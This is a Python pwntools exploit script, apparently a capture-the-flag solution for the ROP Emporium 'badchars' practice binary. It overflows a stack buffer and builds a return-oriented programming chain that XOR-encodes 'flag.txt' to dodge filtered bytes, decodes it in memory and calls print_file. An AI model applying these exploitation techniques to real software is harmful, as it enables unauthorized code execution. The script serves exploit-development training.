#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./badchars')
context.terminal = ["/usr/bin/konsole", "-e", "sh", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

def extend_byte(byte: int) -> int:
    """
    Extend a byte into a 64-bit integer by duplicating the byte 8 times
    """
    return int("0x" + (hex(byte)[2:4])*8, 16)

# input must be 8 bytes long, key must be between 0 and 255
def encode(input: bytes, key: int, badchars: bytes) -> bytes:
    unencoded = u64(input)
    encoded = p64(unencoded ^ key)
    for badchar in badchars:
        if p8(badchar) in encoded:
            raise ValueError(f"bad byte in final encoded: {encoded}")
    return encoded

BADCHARS = b"xga."
# make sure 1st bit is 1 because all of the badchars don't have a 1 in front
KEY = 0xa9
XKEY = extend_byte(KEY)
# had to use .bss section because if i use the .data section one of the memory addresses will
# be converted into a string with a '.' in it which is one of the bad chars
DATA = 0x601038 # .bss not .data
POPR14R15 = p64(0x4006a0) # pop r14 ; pop r15 ; ret
XORBR15R14 = p64(0x400628) # xor byte ptr [r15], r14b ; ret
POPR12R13R14R15 = p64(0x40069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
MOVR13R12 = p64(0x400634) # mov qword ptr [r13], r12 ; ret
POPRDI = p64(0x4006a3) # pop rdi ; ret
RET = p64(0x4004ee) # ret
PRINT_FILE = p64(0x400510) # print_file()

ENCODED_1 = encode(b"flag.txt", XKEY, BADCHARS)
print(ENCODED_1)

attack = b"A"*0x28 + POPR12R13R14R15 + ENCODED_1 + p64(DATA) + b"B"*16
# attack += POPR12R13R14R15 + b"\x00"*8 + p64(DATA+8) + b"JUNK"*4
# r13 -> .data
# r12 -> encoded string
attack += MOVR13R12 # move encoded string into .data

# unfortunately we have to do this byte-by-byte because 0x400628 only does 1 byte
for index, byte in enumerate(b"flag.txt"):
    unencoder = POPR14R15 + p64(KEY) + p64(DATA+index) + XORBR15R14
    attack += unencoder

attack += POPRDI + p64(DATA) + RET + PRINT_FILE

print(attack)
print(len(attack))
io.sendline(attack)

io.interactive()
